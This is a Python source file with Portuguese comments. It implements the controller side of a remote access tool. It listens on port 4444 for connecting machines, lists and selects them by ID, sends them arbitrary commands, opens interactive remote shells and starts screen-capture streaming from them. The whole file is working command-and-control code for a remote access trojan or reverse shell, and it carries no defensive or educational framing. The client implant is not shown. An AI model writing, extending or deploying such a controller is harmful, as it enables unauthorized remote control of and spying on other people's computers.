import select
import socket
import threading
import time
from vidstream import StreamingServer

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}  # Dicionário para armazenar os clientes conectados com suas IDs e IPs
        self.next_client_id = 1  # Próxima ID disponível
        self.current_client_id = None  # ID do cliente atualmente em foco
        self.server_thread = threading.Thread(target=self.start)
        self.server_thread.daemon = True  # Define a thread do servidor como daemon
        self.stream_server = None

    def handle_client(self, client_socket, addr):
        # Lógica para lidar com um cliente específico
        client_id = self.next_client_id
        self.next_client_id += 1
        self.clients[client_id] = {'socket': client_socket, 'addr': addr}
        print(f"[*] Connection is established with {addr} (ID: {client_id})")
        while True:
            data = client_socket.recv(1024)
            if not data:
                print(f"[*] Connection with {addr} (ID: {client_id}) is closed.")
                del self.clients[client_id]
                client_socket.close()
                break

            # Faça o que você precisa com os dados recebidos do cliente
            print(f"Received data from {addr} (ID: {client_id}): {data.decode()}")
            break

    def execute_command_on_client(self, client_id, command):
        client_info = self.clients.get(client_id)
        if client_info:
            client_socket = client_info['socket']
            client_socket.send(command.encode())

            # Defina um temporizador de 1 segundo para aguardar a resposta do servidor
            timeout = 1
            start_time = time.time()
            while True:
                ready = select.select([client_socket], [], [], timeout)
                if ready[0]:
                    response = client_socket.recv(4096).decode()
                    print(f"Response from client (ID {client_id}):")
                    print(response)
                    break
                elif time.time() - start_time >= timeout:
                    break
        else:
            print(f"Client with ID {client_id} not found.")

    def start_shell_session(self, client_id):
        client_info = self.clients.get(client_id)
        if client_info:
            client_socket = client_info['socket']
            client_socket.send("shell".encode())  # Envie o comando "shell" para o cliente

            def receive_output():
                while True:
                    response = client_socket.recv(4096).decode()
                    if not response:
                        break
                    print(response)

            output_thread = threading.Thread(target=receive_output)
            output_thread.daemon = True
            output_thread.start()

            while True:
                command = input(f"Shell (ID {client_id}) >> ")
                client_socket.send(command.encode())
                if command.lower() == 'exit':
                    break
                while True:
                    ready = select.select([client_socket], [], [], 1) # Tempo de 1 segundos para liberar o prompt
                    if ready[0]:
                        response = client_socket.recv(4096).decode()
                        if response:
                            print(response)
                        break
                    else:
                        break
        else:
            print(f"Client with ID {client_id} not found.")

    def start_screenshare_session(self, client_id):

        client_info = self.clients.get(client_id)
        if client_info:
            client_socket = client_info['socket']
            client_socket.send('screenshare'.encode())

            # Aguarde a resposta do cliente para confirmar que ele iniciou o screenshare
            response = client_socket.recv(1024).decode()
            print(response)
            if response == 'screenshare_started':
                print(f"Screenshare session started with client (ID {client_id}).")
                from vidstream import StreamingServer
                self.stream_server = StreamingServer(self.host, 8080)
                self.stream_server.start_server()
            else:
                print(f"Failed to start screenshare session with client (ID {client_id}).")
        else:
            print(f"Client with ID {client_id} not found.")

    def stop_stream_server(self):
        if self.stream_server is not None:
            self.stream_server.stop_server()

    def list_clients(self):
        # Listar os clientes conectados com suas IDs e IPs
        print("Connected Clients:")
        for client_id, client_info in self.clients.items():
            print(f"ID: {client_id}, IP: {client_info['addr'][0]}")

    def use_client(self, client_id):
        # Selecionar um cliente pelo ID
        client_info = self.clients.get(client_id)
        if client_info:
            self.current_client_id = client_id
            print(f"Using client ID: {client_id}, IP: {client_info['addr'][0]}")
        else:
            print(f"Client with ID {client_id} not found.")

    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print(f"[*] Listening on {self.host}:{self.port}")

        while True:
            print("[*] Waiting for a client...")
            client_socket, addr = s.accept()

            # Inicie uma nova thread para lidar com o cliente
            client_handler = threading.Thread(target=self.handle_client, args=(client_socket, addr))
            client_handler.start()

    def start_server(self):
        # Inicie o servidor em uma thread separada
        self.server_thread.start()

if __name__ == '__main__':
    server = Server('192.168.68.104', 4444)
    server.start_server()

    while True:
        command = input("Enter a command (list/use/execute/quit): ").split()
        
        if len(command) > 0:
            if command[0] == 'list':
                server.list_clients()
            elif command[0] == 'use':
                if len(command) == 2:
                    try:
                        client_id = int(command[1])
                        server.use_client(client_id)
                    except ValueError:
                        print("Invalid client ID.")
                else:
                    print("Usage: use <client_id>")
            elif command[0] == 'execute':
                if server.current_client_id is not None:
                    if len(command) >= 2:
                        full_command = ' '.join(command[1:])
                        server.execute_command_on_client(server.current_client_id, full_command)
                    else:
                        print("Usage: execute <command>")
                else:
                    print("No client is currently in focus. Use 'use <client_id>' to select a client.")

            elif command[0] == 'shell':
                if server.current_client_id is not None:
                    server.start_shell_session(server.current_client_id)
                else:
                    print("No client is currently in focus. Use 'use <client_id>' to select a client.")
            
            elif command[0] == 'screenshare':
                if server.current_client_id is not None:
                    server.start_screenshare_session(server.current_client_id)
                else:
                    print("No client is currently in focus. Use 'use <client_id>' to select a client.")

            elif command[0] == 'breakstream':
                server.stop_stream_server()

            elif command[0] == 'quit':
                break
            else:
                print("Unknown command.")